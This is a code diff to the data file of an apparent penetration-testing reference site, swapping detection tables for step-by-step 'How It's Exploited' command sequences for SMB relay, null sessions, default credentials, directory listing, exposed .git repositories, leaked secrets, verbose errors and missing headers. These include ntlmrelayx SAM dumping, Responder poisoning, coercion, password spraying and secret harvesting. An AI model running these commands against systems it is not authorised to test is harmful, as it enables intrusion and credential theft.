@@ -3805,7 +3805,7 @@ var VULNS = [
       }
     ]
   },
-  {
+    {
     category: "Misconfigurations",
     vulns: [
       {
@@ -3815,7 +3815,7 @@ var VULNS = [
         ref: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/",
         theory: "theory/2026-08-18-coercion-ntlm-relay.html",
         description: "Hosts that do not require SMB signing can be targeted by NTLM relay, turning a captured authentication into access.",
-        brief: "SMB signing cryptographically signs SMB sessions so a man-in-the-middle cannot tamper with or relay them. When it is not required (the default on non-DC Windows for years), a host becomes a valid NTLM relay target: an attacker who coerces or poisons an authentication can forward it to that host and act as the victim — dumping the SAM or executing commands.\n\nIt is one of the most common and impactful internal misconfigurations, because it converts everyday name-resolution noise into lateral movement.",
+        brief: "SMB signing cryptographically signs SMB sessions so a man-in-the-middle cannot tamper with or relay them. When it is not required (the default on non-DC Windows for years), a host becomes a valid NTLM relay target: an attacker who coerces or poisons an authentication forwards it to that host and acts as the victim.\n\nImpact: lateral movement, SAM/LSA dumping, and command execution on every unsigned host — one of the most common and impactful internal misconfigurations, because it converts everyday name-resolution noise into access.",
         quickReference: [
           { label: "Find hosts without signing", cmd: "netexec smb 10.0.0.0/24 --gen-relay-list targets.txt" },
           { label: "Check a single host", cmd: "netexec smb 10.0.0.5   (look for signing:False)" },
@@ -3823,6 +3823,17 @@ var VULNS = [
           { label: "nmap", cmd: "nmap --script smb2-security-mode -p445 <host>" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Enumerate hosts that do not require signing", cmd: "netexec smb 10.0.0.0/24                 # note signing:False in the banner\nnetexec smb 10.0.0.0/24 --gen-relay-list targets.txt   # collect relay targets\nnmap --script smb2-security-mode -p445 10.0.0.0/24      # cross-check" },
+              { label: "2. Start the relay against the unsigned targets", cmd: "# tell Responder NOT to answer SMB/HTTP so relay can (Responder.conf: SMB=Off, HTTP=Off)\nntlmrelayx.py -tf targets.txt -smb2support -i\n# -i drops an interactive SMB client per successful relay; -c '<cmd>' to run a command" },
+              { label: "3. Generate the authentication to relay", cmd: "# poison name resolution (see LLMNR/NBT-NS) or coerce a host:\nresponder -I eth0 -wd                    # capture stray auth\ncoercer coerce -u user -p pass -t 10.0.0.9 -l ATTACKER   # force DC/host to auth" },
+              { label: "4. Act on the relayed session", cmd: "# ntlmrelayx with -c runs directly; or use the -i socks:\nntlmrelayx.py -tf targets.txt -smb2support -c 'whoami'\nntlmrelayx.py -tf targets.txt -smb2support --dump-sam    # dump SAM on the target" },
+              { label: "5. Escalate", cmd: "# relay a coerced DC computer account or admin to escalate:\n# combine with RBCD or ADCS (ESC8) relay for domain impact" }
+            ]
+          },
           {
             title: "Detection",
             type: "table",
@@ -3835,14 +3846,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Impact",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Outcome", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Lateral movement", "Relay a captured/coerced auth to the unsigned host and act as the victim"],
-              ["Credential dumping", "Dump SAM/LSA secrets from the relayed-to host"],
-              ["Command execution", "Run commands as the relayed identity"],
-              ["Chain to domain", "Combine with coercion of a privileged account for a larger foothold"]
+              ["1", "Scan for signing:False hosts", "Relay target list"],
+              ["2", "Start ntlmrelayx against them", "Relay listener ready"],
+              ["3", "Poison / coerce an authentication", "Victim auth arrives"],
+              ["4", "Relay to the unsigned host", "SAM dump / command execution"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["NetExec", "Enumerate signing state and build the relay list"],
+              ["Impacket ntlmrelayx", "Perform the NTLM relay and post-exploitation"],
+              ["Responder", "Poison name resolution to capture authentications"],
+              ["Coercer / PetitPotam", "Coerce a host into authenticating"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "BHIS — SMB Relay Race", url: "https://www.blackhillsinfosec.com/an-smb-relay-race-how-to-exploit-llmnr-and-smb-message-signing-for-fun-and-profit/" },
+              { label: "The Hacker Recipes — NTLM relay", url: "https://www.thehacker.recipes/ad/movement/ntlm/relay" }
             ]
           },
           {
@@ -3864,14 +3894,25 @@ var VULNS = [
         severity: "Medium",
         ref: "https://attack.mitre.org/techniques/T1087/",
         description: "Unauthenticated SMB/RPC or LDAP access leaks users, groups, shares, and the password policy.",
-        brief: "A null (anonymous) session is unauthenticated access to a Windows host's SMB/RPC interfaces, historically allowing enumeration of users, groups, shares, and the password policy without any credential. Anonymous LDAP binds are the directory equivalent. Modern Windows locks most of this down, but legacy configurations, older hosts, and misconfigured services still expose it.\n\nThe information it leaks — usernames, the lockout policy, share names — is the groundwork for password spraying and further attacks.",
+        brief: "A null (anonymous) session is unauthenticated access to a Windows host's SMB/RPC interfaces, historically allowing enumeration of users, groups, shares, and the password policy without any credential. Anonymous LDAP binds are the directory equivalent.\n\nImpact: the leaked usernames, lockout policy, and share names are the groundwork for password spraying and further attacks. Modern Windows locks most of this down, but legacy configurations and misconfigured services still expose it.",
         quickReference: [
           { label: "Null SMB enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>" },
           { label: "NetExec null check", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol" },
-          { label: "RID cycling", cmd: "enum4linux-ng -R <host>   (enumerate users via SID walking)" },
+          { label: "RID cycling", cmd: "netexec smb <host> -u '' -p '' --rid-brute" },
           { label: "Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\"" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Try an empty credential over SMB", cmd: "netexec smb <host> -u '' -p '' --shares --users --pass-pol\nnetexec smb <host> -u 'guest' -p '' --shares      # guest may also be enabled\n# any returned data = null/guest access" },
+              { label: "2. Full anonymous enumeration", cmd: "enum4linux-ng -A -u '' -p '' <host>\n# pulls users, groups, shares, password policy, and the domain SID in one pass" },
+              { label: "3. RID cycling when direct listing is blocked", cmd: "netexec smb <host> -u '' -p '' --rid-brute 4000\n# walks the domain SID (S-1-5-21-...-500,501,1000...) to enumerate accounts\n# recovers usernames even when SAMR enumeration is denied" },
+              { label: "4. Anonymous LDAP bind", cmd: "ldapsearch -x -H ldap://<dc> -b \"DC=corp,DC=local\" \"(objectClass=user)\" sAMAccountName\n# an unauthenticated bind that returns directory objects" },
+              { label: "5. Turn the leak into an attack", cmd: "# build a user list + read the lockout policy, then spray safely below the threshold:\nnetexec smb <dc> -u users.txt -p 'Winter2026!' --continue-on-success" }
+            ]
+          },
           {
             title: "What It Leaks",
             type: "table",
@@ -3885,14 +3926,33 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Method", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Try an empty credential", "'' / '' over SMB and RPC; a guest account may also be enabled"],
-              ["Anonymous LDAP", "An unauthenticated bind that returns directory data"],
-              ["RID cycling fallback", "Works via the domain SID when -U is blocked"],
-              ["Modern reality", "Usually closed on current Windows — do not assume a host is hardened from one empty result"]
+              ["1", "Send an empty credential", "Confirm anonymous access"],
+              ["2", "Enumerate users + policy (or RID cycle)", "Username list + lockout policy"],
+              ["3", "Read accessible shares", "Config/secret discovery"],
+              ["4", "Password-spray within policy", "Valid credentials"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["enum4linux-ng", "Comprehensive anonymous SMB/RPC enumeration"],
+              ["NetExec", "Null checks, --rid-brute, share/user/policy enumeration"],
+              ["ldapsearch", "Test and query anonymous LDAP binds"],
+              ["rpcclient", "Manual RPC enumeration over a null session"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "MITRE ATT&CK — Account Discovery (T1087)", url: "https://attack.mitre.org/techniques/T1087/" },
+              { label: "The Hacker Recipes — SMB enumeration", url: "https://www.thehacker.recipes/ad/recon/nmap" }
             ]
           },
           {
@@ -3914,14 +3974,25 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/",
         description: "Devices, panels, and services left on vendor-default or well-known credentials grant instant access.",
-        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in. Admin panels, routers, printers, databases, management interfaces, and internal tools are the usual offenders.\n\nIt is unglamorous and extremely common, and it frequently provides the highest-privilege access on a network for zero effort.",
+        brief: "Default credentials are the factory or documented username/password pairs shipped with software, appliances, and services. When they are never changed, anyone who knows the vendor default — and they are all published — logs straight in.\n\nImpact: instant, often highest-privilege access to admin panels, routers, printers, databases, and management interfaces. It is unglamorous and extremely common, frequently providing the best foothold on a network for zero effort.",
         quickReference: [
           { label: "Classic pairs", cmd: "admin/admin  admin/password  root/root  sa/(blank)  tomcat/tomcat" },
           { label: "Product examples", cmd: "Jenkins, Grafana admin/admin; Tomcat manager; iDRAC/iLO; DB defaults" },
           { label: "Spray defaults across a service", cmd: "netexec <proto> <targets> -u users.txt -p defaults.txt --no-bruteforce" },
-          { label: "References", cmd: "Vendor manuals, SecLists Passwords/Default-Credentials, DefaultCreds-cheat-sheet" }
+          { label: "References", cmd: "Vendor manuals, SecLists Default-Credentials, DefaultCreds-cheat-sheet" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Fingerprint the product", cmd: "whatweb https://target        # identify the software + version\nnuclei -u https://target -tags tech    # tech detection\n# knowing the product tells you which default to try" },
+              { label: "2. Look up the documented default", cmd: "# consult vendor docs / default-credential databases:\n#   SecLists/Passwords/Default-Credentials, DefaultCreds-cheat-sheet\n# e.g. Grafana admin/admin, Tomcat tomcat/tomcat, RabbitMQ guest/guest" },
+              { label: "3. Test the top pairs (mind lockouts)", cmd: "# web panel: try the documented pair in the login form\n# services, non-destructively:\nnetexec ssh 10.0.0.0/24 -u root -p 'toor' --no-bruteforce\nnetexec mssql <host> -u sa -p '' \n# --no-bruteforce pairs the i-th user with the i-th password only" },
+              { label: "4. Automate across many products", cmd: "nuclei -u https://target -tags default-login\n# default-logins/ templates try known product defaults automatically" },
+              { label: "5. Confirm and use the access", cmd: "# log in; e.g. Tomcat manager -> deploy a WAR web shell,\n# Jenkins -> script console RCE, iDRAC/iLO -> virtual media / console" }
+            ]
+          },
           {
             title: "Where to Look",
             type: "table",
@@ -3935,14 +4006,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Fingerprint the product", "WhatWeb/Nuclei identifies the software so you know the default to try"],
-              ["Consult the default list", "Vendor docs and default-credential databases"],
-              ["Test carefully", "Try the top pairs; mind lockouts on real accounts"],
-              ["Nuclei templates", "default-logins/ templates automate the check across many products"]
+              ["1", "Fingerprint the product", "Known default to try"],
+              ["2", "Look up the vendor default", "Candidate credential pair"],
+              ["3", "Log in with the default", "Authenticated access"],
+              ["4", "Abuse the panel's features", "RCE / data / pivot"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["WhatWeb / Nuclei", "Fingerprint products and run default-login templates"],
+              ["NetExec", "Test default pairs across SMB/SSH/MSSQL/WinRM/etc."],
+              ["SecLists / DefaultCreds-cheat-sheet", "Authoritative default-credential lists"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Security Misconfiguration (A05:2021)", url: "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/" },
+              { label: "DefaultCreds-cheat-sheet", url: "https://github.com/ihebski/DefaultCreds-cheat-sheet" }
             ]
           },
           {
@@ -3964,14 +4053,25 @@ var VULNS = [
         severity: "Low",
         ref: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing",
         description: "The web server auto-indexes folders without an index file, exposing files that were never meant to be browsable.",
-        brief: "When a web server is configured to auto-generate a listing for directories that lack an index file, it reveals every file in that folder — including backups, source, config, uploads, and old versions that were never linked and were assumed hidden. It is low severity by itself, but it routinely exposes other findings: credentials in a stray config, a database dump, or source code.\n\nThe fix is simply to disable automatic indexing.",
+        brief: "When a web server auto-generates a listing for directories that lack an index file, it reveals every file in that folder — including backups, source, config, uploads, and old versions that were never linked and were assumed hidden.\n\nImpact: low by itself, but it routinely exposes serious findings — credentials in a stray config, a database dump, or source code. The fix is simply to disable automatic indexing.",
         quickReference: [
           { label: "Spot it", cmd: "Page titled 'Index of /' with a file listing" },
           { label: "Dork for it", cmd: "site:target.com intitle:\"index of\"" },
           { label: "Probe common dirs", cmd: "/uploads/  /backup/  /files/  /.git/  /assets/  /tmp/" },
-          { label: "Scan", cmd: "nuclei -tags exposure; or content discovery with ffuf/feroxbuster" }
+          { label: "Scan", cmd: "nuclei -tags exposure; or content discovery with feroxbuster" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Find directories with content discovery", cmd: "feroxbuster -u https://target -w raft-medium-directories.txt\nffuf -u https://target/FUZZ -w directory-list.txt\n# note any directory that returns a listing rather than 403/index page" },
+              { label: "2. Confirm auto-indexing", cmd: "curl -s https://target/uploads/ | grep -i 'Index of'\n# an 'Index of /uploads' page = directory listing enabled" },
+              { label: "3. Harvest the exposed files", cmd: "# browse the listing for high-value files:\n/backup/  -> site.zip, db.sql, *.bak\n/config/  -> .env, config.php\n/uploads/ -> other users' documents\ncurl -sO https://target/backup/db.sql" },
+              { label: "4. Search-engine shortcut", cmd: "# find indexed listings without touching the target:\nsite:target.com intitle:\"index of\"\nsite:target.com intitle:\"index of\" (backup OR sql OR env)" },
+              { label: "5. Loot the findings", cmd: "# pull secrets/source from what the listing revealed, then use them\n# (see Exposed Secrets and Exposed .git/Source & Backups)" }
+            ]
+          },
           {
             title: "What It Exposes",
             type: "table",
@@ -3985,14 +4085,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Method", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Browse directories", "Request a folder path with no index file"],
-              ["Search engines", "intitle:\"index of\" scoped to the domain"],
-              ["Content discovery", "ffuf/feroxbuster reveal directories to check"],
-              ["Scanners", "Nikto and Nuclei exposure templates flag indexing"]
+              ["1", "Discover directories", "Candidate folders"],
+              ["2", "Confirm auto-indexing", "Browsable listing"],
+              ["3", "Enumerate the listed files", "Backups/config/source found"],
+              ["4", "Extract secrets/source", "Escalated access"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["feroxbuster / ffuf", "Directory discovery to find listable folders"],
+              ["Nuclei / Nikto", "Flag directory indexing and exposed files"],
+              ["Search engines (dorks)", "Locate already-indexed listings passively"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Directory Indexing", url: "https://owasp.org/www-community/vulnerabilities/Directory_Indexing" },
+              { label: "OWASP WSTG — Review Webserver Metafiles / Directory Listing", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/02-Configuration_and_Deployment_Management_Testing/" }
             ]
           },
           {
@@ -4014,7 +4132,7 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code",
         description: "A deployed .git folder, backup archive, or editor swap file lets an attacker reconstruct source and extract secrets.",
-        brief: "Deploying a site with its version-control metadata or leaving backups under the web root exposes the application's source. A reachable /.git/ directory can be downloaded and the full repository — including history and secrets in old commits — reconstructed. Backup archives (.zip, .bak, .sql), editor swap/temp files, and .DS_Store listings do the same for source and data.\n\nSource disclosure hands an attacker the code to find further bugs and, very often, hardcoded credentials.",
+        brief: "Deploying a site with its version-control metadata or leaving backups under the web root exposes the application's source. A reachable /.git/ directory can be downloaded and the full repository — including secrets in old commits — reconstructed. Backup archives, editor swap/temp files, and .DS_Store listings do the same.\n\nImpact: full source disclosure (to find further bugs) and, very often, hardcoded credentials from history — frequently a direct path to deeper compromise.",
         quickReference: [
           { label: "Detect exposed git", cmd: "curl -s https://target.com/.git/HEAD   (returns 'ref: refs/heads/...')" },
           { label: "Dump the repo", cmd: "git-dumper https://target.com/.git ./out   (then git log -p for secrets)" },
@@ -4022,6 +4140,17 @@ var VULNS = [
           { label: "Other VCS/CI", cmd: "/.svn/  /.hg/  /.gitignore  /.git/config  exposed CI files" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Probe for an exposed repository", cmd: "curl -s https://target/.git/HEAD          # 'ref: refs/heads/main' = exposed\ncurl -s https://target/.git/config        # remote URL, more confirmation\ncurl -s https://target/.svn/entries       # SVN variant" },
+              { label: "2. Reconstruct the full repo", cmd: "git-dumper https://target/.git ./loot\ncd loot && git log --oneline               # full history recovered\n# works even without directory listing, by walking git objects" },
+              { label: "3. Mine history for secrets", cmd: "cd loot\ngit log -p | grep -iE 'password|api[_-]?key|secret|token'\ntrufflehog git file://./ --json\ngitleaks detect -s ./ -v                    # secrets in current + old commits" },
+              { label: "4. Guess backup / temp artifacts", cmd: "for f in backup.zip db.sql index.php.bak .env config.php~ .DS_Store; do\n  curl -s -o /dev/null -w \"%{http_code} $f\\n\" https://target/$f; done\n# 200 -> download and inspect" },
+              { label: "5. Use the recovered source/secrets", cmd: "# read the code to find logic bugs and endpoints;\n# use any recovered DB/cloud/API credential directly against the backend" }
+            ]
+          },
           {
             title: "Exposure Types",
             type: "table",
@@ -4035,14 +4164,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Step", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Probe /.git/HEAD", "A valid ref confirms an exposed repository"],
-              ["Guess backup names", "Content discovery with common backup/temp extensions"],
-              ["Scanners", "Nuclei exposure templates and Nikto flag these"],
-              ["Mine history", "Once dumped, git log -p and secret scanners (trufflehog/gitleaks) find keys"]
+              ["1", "Probe /.git/HEAD or backup names", "Confirm exposure"],
+              ["2", "git-dumper the repository", "Full source + history"],
+              ["3", "Scan history for secrets", "Credentials / keys"],
+              ["4", "Use source + secrets", "Deeper compromise"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["git-dumper", "Reconstruct a repository from an exposed /.git/"],
+              ["trufflehog / gitleaks", "Find secrets across current and historical commits"],
+              ["feroxbuster / Nuclei", "Discover backup/temp artifacts and exposure"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Information exposure through source code", url: "https://owasp.org/www-community/vulnerabilities/Information_exposure_through_source_code" },
+              { label: "git-dumper", url: "https://github.com/arthaud/git-dumper" }
             ]
           },
           {
@@ -4064,24 +4211,23 @@ var VULNS = [
         severity: "High",
         ref: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials",
         description: "Credentials and API keys leaked in client-side code, repos, or responses grant direct access to backends.",
-        brief: "Applications leak secrets in many places: hardcoded in front-end JavaScript, committed to public repositories, left in config files, or returned in API responses and error messages. A single leaked cloud key, database credential, or third-party token can give an attacker direct access to backend systems — bypassing the application entirely.\n\nThis is distinct from a code bug: the secret is simply exposed. Finding and rotating leaked secrets, and keeping them out of anything client-reachable, is the defence.",
+        brief: "Applications leak secrets in many places: hardcoded in front-end JavaScript, committed to public repositories, left in config files, or returned in API responses and error messages. A single leaked cloud key, database credential, or third-party token gives direct access to backend systems — bypassing the application entirely.\n\nImpact: ranges from abusing a paid API to full cloud-account compromise, depending on the secret. Finding and rotating leaked secrets, and keeping them out of anything client-reachable, is the defence.",
         quickReference: [
-          { label: "Mine front-end JS", cmd: "grep -oiE '(api[_-]?key|secret|token|password|bearer)[\"'\\'':= ]+[A-Za-z0-9_\\-]{16,}' app.js" },
+          { label: "Mine front-end JS", cmd: "grep -oiE '(api[_-]?key|secret|token|bearer)[\"'\\'':= ]+[A-Za-z0-9_\\-]{16,}' app.js" },
           { label: "Public repos", cmd: "GitHub code search: \"target.com\" api_key ; org:target filename:.env" },
           { label: "Repo history scan", cmd: "trufflehog git file://./repo ; gitleaks detect -s ./repo" },
           { label: "Common locations", cmd: "JS bundles, /.env, config files, source maps (.js.map), API/error responses" }
         ],
         sections: [
           {
-            title: "Where Secrets Leak",
-            type: "table",
-            columns: ["Location", "Detail"],
-            rows: [
-              ["Client-side JS", "Keys embedded in bundles/source maps, reachable by anyone"],
-              ["Public code", "GitHub/GitLab repos and gists, especially old commits"],
-              ["Config files", ".env, appsettings.json, web.config under the web root"],
-              ["API/error responses", "Tokens or connection strings echoed in output"],
-              ["Archives & history", "Wayback-archived JS and prior git commits"]
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Harvest front-end JavaScript", cmd: "# collect every script, including source maps:\nfor u in $(cat js_urls.txt); do curl -s $u -o \"loot/$(basename $u)\"; done\ngrep -rniE '(api[_-]?key|secret|token|password|bearer)[\"'\\'':= ]+[A-Za-z0-9_-]{16,}' loot/" },
+              { label: "2. Search public code", cmd: "# GitHub code/secret search for the org and domain:\n\"target.com\" api_key      org:target filename:.env\n# also gists and archived pages (Wayback) of old JS bundles" },
+              { label: "3. Scan repositories and history", cmd: "trufflehog git file://./repo --json\ngitleaks detect -s ./repo -v\n# both flag live and historical secrets with the rule that matched" },
+              { label: "4. Pull secrets from API / error responses", cmd: "# tokens or connection strings sometimes echoed in output:\ncurl -s https://target/api/config | grep -iE 'key|token|conn'\n# trigger an error and read any leaked connection string" },
+              { label: "5. Validate and use the key", cmd: "# confirm scope before acting (in scope only):\naws sts get-caller-identity          # AWS key validity + identity\n# DB creds -> connect; 3rd-party token -> call its API" }
             ]
           },
           {
@@ -4094,6 +4240,36 @@ var VULNS = [
               ["Third-party API tokens", "Abuse paid/privileged services, pivot to partner systems"],
               ["Signing secrets", "Forge JWTs/sessions (see JWT Vulnerabilities)"],
               ["Internal service creds", "Reach internal APIs and infrastructure"]
+            ]
+          },
+          {
+            title: "Attack Chain",
+            type: "table",
+            columns: ["Step", "Action", "Result"],
+            rows: [
+              ["1", "Collect JS / repos / responses", "Corpus to search"],
+              ["2", "Scan for secret patterns", "Candidate secrets"],
+              ["3", "Validate the secret", "Confirmed live credential"],
+              ["4", "Use it against the backend", "Direct backend/cloud access"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["trufflehog / gitleaks", "Detect secrets in code and git history"],
+              ["Burp / grep", "Mine JS bundles, source maps, and responses"],
+              ["GitHub code search", "Find leaked secrets in public repos and gists"],
+              ["cloud CLIs (aws/az/gcloud)", "Validate and scope a discovered key"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Use of hard-coded credentials", url: "https://owasp.org/www-community/vulnerabilities/Use_of_hard-coded_credentials" },
+              { label: "OWASP — Secrets Management Cheat Sheet", url: "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html" }
             ]
           },
           {
@@ -4115,7 +4291,7 @@ var VULNS = [
         severity: "Low",
         ref: "https://owasp.org/www-community/Improper_Error_Handling",
         description: "Stack traces and debug output reveal versions, paths, queries, and internals that aid further attacks.",
-        brief: "When an application returns detailed error output — stack traces, SQL queries, file paths, framework versions, debug pages — it hands an attacker a map of its internals. On its own each leak is minor, but together they accelerate every other attack: confirming an injection, revealing the tech stack for targeted CVEs, and exposing internal hostnames and paths.\n\nProduction systems should show generic errors to users and log the detail server-side.",
+        brief: "When an application returns detailed error output — stack traces, SQL queries, file paths, framework versions, debug pages — it hands an attacker a map of its internals.\n\nImpact: individually minor, but together these leaks accelerate every other attack — confirming an injection, revealing the stack for targeted CVEs, exposing internal hostnames and paths, and occasionally offering a debug console with code execution. Production systems should show generic errors and log detail server-side.",
         quickReference: [
           { label: "Trigger errors", cmd: "Send malformed input, wrong types, a stray ', or a bad path" },
           { label: "Debug-mode tells", cmd: "Django/Flask debug page, ASP.NET yellow screen, Rails error, Whoops (PHP)" },
@@ -4123,6 +4299,17 @@ var VULNS = [
           { label: "Config leaks", cmd: "Debug endpoints, /server-status, verbose 500s, X-Powered-By headers" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Provoke errors deliberately", cmd: "# malformed/unexpected input across parameters and paths:\n?id=1'                 # DB error -> confirms + reveals query\nPOST with wrong Content-Type / a string where a number is expected\nGET /nonexistent%00     # bad path -> stack trace" },
+              { label: "2. Read the fingerprint from the response", cmd: "# harvest from the error body + headers:\ncurl -sI https://target | grep -iE 'server|x-powered-by|x-aspnet-version'\n# stack traces reveal framework, version, absolute file paths, code structure" },
+              { label: "3. Look for a debug console left on", cmd: "# Flask/Werkzeug debugger, Django DEBUG=True, Symfony profiler, Rails web-console\n# Werkzeug's interactive debugger can execute Python if reachable (and PIN-bypassable)" },
+              { label: "4. Map the stack to known CVEs", cmd: "# version banners -> searchsploit / advisories:\nsearchsploit <framework> <version>\n# absolute paths feed LFI/traversal; SQL fragments confirm injection structure" },
+              { label: "5. Aggregate the leaks", cmd: "# combine tech stack + paths + internal hostnames to plan targeted exploitation\n# a single verbose 500 often turns a blind bug into a confirmed one" }
+            ]
+          },
           {
             title: "What Gets Leaked",
             type: "table",
@@ -4136,14 +4323,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Method", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Force errors", "Bad input, wrong methods, non-existent paths"],
-              ["Check headers", "X-Powered-By, Server, and framework-specific headers"],
-              ["Look for debug mode", "Framework debug pages left enabled in production"],
-              ["Scanners", "Nikto/Nuclei flag verbose errors and info-disclosure headers"]
+              ["1", "Force errors with bad input", "Verbose error output"],
+              ["2", "Harvest stack/versions/paths", "Internal fingerprint"],
+              ["3", "Map versions to CVEs / confirm a bug", "Targeted exploit path"],
+              ["4", "Abuse a live debug console (if any)", "Code execution"]
+            ]
+          },
+          {
+            title: "Tools Used",
+            type: "table",
+            columns: ["Tool", "Purpose"],
+            rows: [
+              ["Burp Suite / curl", "Trigger and inspect error responses and headers"],
+              ["Nikto / Nuclei", "Flag verbose errors, debug modes, info-disclosure headers"],
+              ["searchsploit", "Map leaked versions to known exploits"]
+            ]
+          },
+          {
+            title: "References",
+            type: "references",
+            items: [
+              { label: "OWASP — Improper Error Handling", url: "https://owasp.org/www-community/Improper_Error_Handling" },
+              { label: "OWASP WSTG — Testing for Error Handling", url: "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/08-Testing_for_Error_Handling/" }
             ]
           },
           {
@@ -4165,7 +4370,7 @@ var VULNS = [
         severity: "Low",
         ref: "https://owasp.org/www-project-secure-headers/",
         description: "Absent HTTP security headers remove browser-side defenses against XSS, clickjacking, and downgrade.",
-        brief: "Modern browsers enforce a set of protections that the server must opt into via response headers. When they are missing, the browser's defense-in-depth against XSS, clickjacking, MIME sniffing, and protocol downgrade is simply not active. No single missing header is critical, but their absence weakens the whole client-side security posture and often accompanies other issues.\n\nSetting them is cheap and high-value hardening.",
+        brief: "Modern browsers enforce a set of protections that the server must opt into via response headers. When they are missing, the browser's defense-in-depth against XSS, clickjacking, MIME sniffing, and protocol downgrade is simply not active.\n\nImpact: no single missing header is critical, but their absence weakens the whole client-side posture and amplifies other bugs (a missing CSP turns a small XSS into a full one; missing frame-ancestors enables clickjacking). Setting them is cheap, high-value hardening.",
         quickReference: [
           { label: "Check headers", cmd: "curl -sI https://target.com   (inspect the response headers)" },
           { label: "The important ones", cmd: "Content-Security-Policy, Strict-Transport-Security, X-Content-Type-Options, X-Frame-Options / frame-ancestors" },
@@ -4173,6 +4378,17 @@ var VULNS = [
           { label: "Cookie flags too", cmd: "Set-Cookie: Secure; HttpOnly; SameSite" }
         ],
         sections: [
+          {
+            title: "How It's Exploited",
+            type: "commands",
+            commands: [
+              { label: "1. Inspect the response headers", cmd: "curl -sI https://target | grep -iE 'content-security-policy|strict-transport|x-frame|x-content-type|referrer-policy|permissions-policy'\n# note which are absent -> each is a disabled browser defence" },
+              { label: "2. No CSP -> amplify XSS", cmd: "# with no Content-Security-Policy, any reflected/stored XSS runs unrestricted:\n#   inline <script>, external script loads, and exfil all succeed\n# a small injection becomes full session theft" },
+              { label: "3. No X-Frame-Options / frame-ancestors -> clickjack", cmd: "<iframe src=\"https://target/settings\"></iframe>   # renders -> framable\n# overlay a decoy to hijack clicks (see Clickjacking)" },
+              { label: "4. No HSTS -> downgrade / SSL-strip", cmd: "# without Strict-Transport-Security, a MitM can force http:// and strip TLS\n# first-visit and mixed-content requests are interceptable" },
+              { label: "5. Weak cookie flags -> theft/CSRF", cmd: "# Set-Cookie missing HttpOnly -> XSS can read it\n# missing Secure -> sent over http; missing SameSite -> cross-site delivery (CSRF)" }
+            ]
+          },
           {
             title: "Key Headers",
             type: "table",
@@ -4187,14 +4403,32 @@ var VULNS = [
             ]
           },
           {
-            title: "Detection",
+            title: "Attack Chain",
             type: "table",
-            columns: ["Method", "Detail"],
+            columns: ["Step", "Action", "Result"],
             rows: [
-              ["Inspect responses", "curl -I or the browser dev-tools network tab"],
-              ["Check every response type", "HTML, API, and error responses may differ"],
